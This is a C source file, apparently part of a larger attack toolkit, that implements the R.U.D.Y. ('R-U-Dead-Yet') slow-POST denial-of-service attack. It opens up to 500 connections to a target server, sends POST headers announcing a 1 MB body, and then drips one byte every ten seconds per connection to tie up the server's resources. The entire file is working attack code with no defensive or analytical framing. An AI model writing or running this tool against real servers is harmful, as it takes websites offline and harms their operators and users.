/**
 * @file rudy.c
 * @brief R.U.D.Y (R-U-Dead-Yet) - Slow POST attack
 * 
 * This attack sends POST requests with large Content-Length but sends
 * the body extremely slowly (one byte every few seconds) to tie up server
 * resources waiting for the complete POST data.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>

#include "../common/logger.h"

#define RUDY_POST_SIZE 1000000  // 1MB POST claim
#define RUDY_BYTE_INTERVAL 10   // Send 1 byte every 10 seconds
#define RUDY_MAX_CONNECTIONS 500

typedef struct {
    int fd;
    size_t bytes_sent;
    time_t last_send;
    bool header_sent;
} rudy_connection_t;

void *attack_rudy(void *arg) {
    struct sockaddr_in *target = (struct sockaddr_in *)arg;
    
    log_info("Starting R.U.D.Y attack on %s:%d",
             inet_ntoa(target->sin_addr), ntohs(target->sin_port));
    
    rudy_connection_t *connections = calloc(RUDY_MAX_CONNECTIONS, 
                                            sizeof(rudy_connection_t));
    
    for (size_t i = 0; i < RUDY_MAX_CONNECTIONS; i++) {
        connections[i].fd = -1;
    }
    
    while (1) {
        time_t now = time(NULL);
        
        // Create new connections
        for (size_t i = 0; i < RUDY_MAX_CONNECTIONS; i++) {
            if (connections[i].fd == -1) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) continue;
                
                if (connect(sock, (struct sockaddr *)target, sizeof(*target)) == 0) {
                    connections[i].fd = sock;
                    connections[i].bytes_sent = 0;
                    connections[i].last_send = now;
                    connections[i].header_sent = false;
                    
                    log_debug("RUDY: New connection established on fd %d", sock);
                }
            }
        }
        
        // Send data on existing connections
        for (size_t i = 0; i < RUDY_MAX_CONNECTIONS; i++) {
            if (connections[i].fd == -1) continue;
            
            // Send POST header if not sent yet
            if (!connections[i].header_sent) {
                char header[512];
                snprintf(header, sizeof(header),
                        "POST /form.php HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: %d\r\n"
                        "Connection: keep-alive\r\n"
                        "\r\n",
                        inet_ntoa(target->sin_addr),
                        RUDY_POST_SIZE);
                
                ssize_t sent = send(connections[i].fd, header, strlen(header), 0);
                if (sent > 0) {
                    connections[i].header_sent = true;
                    log_debug("RUDY: Sent POST header on fd %d", connections[i].fd);
                } else {
                    close(connections[i].fd);
                    connections[i].fd = -1;
                }
                continue;
            }
            
            // Send POST body one byte at a time
            if ((now - connections[i].last_send) >= RUDY_BYTE_INTERVAL) {
                if (connections[i].bytes_sent < RUDY_POST_SIZE) {
                    char byte = 'A';
                    ssize_t sent = send(connections[i].fd, &byte, 1, 0);
                    
                    if (sent > 0) {
                        connections[i].bytes_sent++;
                        connections[i].last_send = now;
                        
                        if (connections[i].bytes_sent % 100 == 0) {
                            log_debug("RUDY: fd %d sent %zu/%d bytes",
                                     connections[i].fd, 
                                     connections[i].bytes_sent, 
                                     RUDY_POST_SIZE);
                        }
                    } else {
                        // Connection died
                        close(connections[i].fd);
                        connections[i].fd = -1;
                    }
                }
            }
        }
        
        sleep(1);
    }
    
    free(connections);
    return NULL;
}
